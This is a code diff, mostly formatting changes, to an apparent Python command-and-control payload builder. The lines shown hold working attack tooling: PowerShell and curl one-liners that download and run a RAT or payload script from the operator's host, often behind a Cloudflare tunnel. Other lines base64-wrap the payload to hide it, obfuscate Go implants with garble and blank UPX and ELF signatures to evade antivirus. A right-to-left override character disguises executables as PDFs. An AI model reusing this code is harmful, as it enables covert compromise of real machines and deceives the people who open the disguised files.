@@ -11,7 +11,6 @@ import json
 import os
 import re
 import shutil
-import subprocess
 import tempfile
 import time
 from collections.abc import Callable
@@ -161,9 +160,7 @@ def _preflight(profile: C2Profile) -> bool:
     """Check that all required external binaries are present."""
     missing = [t for t in profile.required_tools if not is_binary_present(t)]
     if missing:
-        print_error(
-            f"Missing required tools for {profile.name}: {', '.join(missing)}"
-        )
+        print_error(f"Missing required tools for {profile.name}: {', '.join(missing)}")
         return False
     return True
 
@@ -171,10 +168,12 @@ def _preflight(profile: C2Profile) -> bool:
 def _render_template(content: str, context: dict[str, Any]) -> str:
     """Render a template by replacing {key} placeholders with context values."""
     import re
+
     def _replacer(match: re.Match) -> str:
         key = match.group(1)
         return str(context.get(key, match.group(0)))
-    return re.sub(r'\{([a-zA-Z_]\w*)\}', _replacer, content)
+
+    return re.sub(r"\{([a-zA-Z_]\w*)\}", _replacer, content)
 
 
 @contextmanager
@@ -253,9 +252,7 @@ class C2Builder:
                 pass
             if tunnel_url:
                 print(f"Cloudflare Tunnel URL: {tunnel_url}")
-            lhost = input(
-                "Enter your Cloudflare tunnel subdomain (e.g., yoursubdomain.trycloudflare.com): "
-            ).strip()
+            lhost = input("Enter your Cloudflare tunnel subdomain (e.g., yoursubdomain.trycloudflare.com): ").strip()
             lport = "443"
         else:
             lhost = self.params["lhost"]
@@ -326,9 +323,7 @@ chmod +x /tmp/stub && \
             copy2clip(cmd)
             user_agent = user_agent_lin
         elif choice == "3":
-            payload = (
-                f"powershell iwr -uri  {protocol}://{lhost}:{lport}/s/batrat.bat -OutFile batrat.bat{psh_flags} ; .\\batrat.bat"
-            )
+            payload = f"powershell iwr -uri  {protocol}://{lhost}:{lport}/s/batrat.bat -OutFile batrat.bat{psh_flags} ; .\\batrat.bat"
             copy2clip(payload)
             user_agent = user_agent_win
         elif choice == "4":
@@ -352,9 +347,7 @@ chmod +x /tmp/stub && \
             return {}
 
         go_bin = _ensure_go(self.cmd)
-        garble_installed = is_binary_present("garble") or (
-            os.path.isfile(os.path.expanduser("~/go/bin/garble"))
-        )
+        garble_installed = is_binary_present("garble") or (os.path.isfile(os.path.expanduser("~/go/bin/garble")))
         if not garble_installed:
             self.cmd(f"{go_bin} install mvdan.cc/garble@latest")
             self.cmd("sleep 2")
@@ -536,9 +529,7 @@ chmod +x /tmp/stub && \
             self.cmd(cplib)
             self.onecmd(f"service {line}")
             self.onecmd(f"service l_{line}")
-            ofuscate = (
-                "cd sessions && base64 payload.sh | (echo -n '#!/bin/bash\\necho \"' ; cat - ; echo '\" | base64 -d | bash') | sponge payload.sh"
-            )
+            ofuscate = "cd sessions && base64 payload.sh | (echo -n '#!/bin/bash\\necho \"' ; cat - ; echo '\" | base64 -d | bash') | sponge payload.sh"
             self.cmd(ofuscate)
             curl_payload = f"curl -o payload.sh {curl_flags} {protocol}://{lhost}:{lport}/s/payload.sh ; chmod +x payload.sh ; ./payload.sh "
             print_msg(curl_payload)
@@ -579,12 +570,12 @@ chmod +x /tmp/stub && \
         if platform == "linux":
             for target in (line, "monrev"):
                 cmd_anti_upx = (
-                    'cd sessions ; perl -i -0777 -pe \'s/^(.{64})(.{0,256})UPX!.{4}/$1$2\\0\\0\\0\\0\\0\\0\\0\\0/s\' "'
+                    "cd sessions ; perl -i -0777 -pe 's/^(.{64})(.{0,256})UPX!.{4}/$1$2\\0\\0\\0\\0\\0\\0\\0\\0/s' \""
                     + target
                     + '"'
                 )
                 cmd_ant_elf = (
-                    'cd sessions ; perl -i -0777 -pe \'s/^(.{64})(.{0,256})\\x7fELF/$1$2\\0\\0\\0\\0/s\' "'
+                    "cd sessions ; perl -i -0777 -pe 's/^(.{64})(.{0,256})\\x7fELF/$1$2\\0\\0\\0\\0/s' \""
                     + target
                     + '"'
                 )
@@ -593,12 +584,7 @@ chmod +x /tmp/stub && \
 
         elif platform == "windows":
             newname = (
-                self.sessions_dir
-                + "/"
-                + binary.split(".")[0]
-                + "\u202e"
-                + ".pdfx"[::-1]
-                + binary.split(".")[1]
+                self.sessions_dir + "/" + binary.split(".")[0] + "\u202e" + ".pdfx"[::-1] + binary.split(".")[1]
             ).encode("utf-8")
             print_msg("New Camuflage File " + str(newname))
             shutil.copy(file, newname)
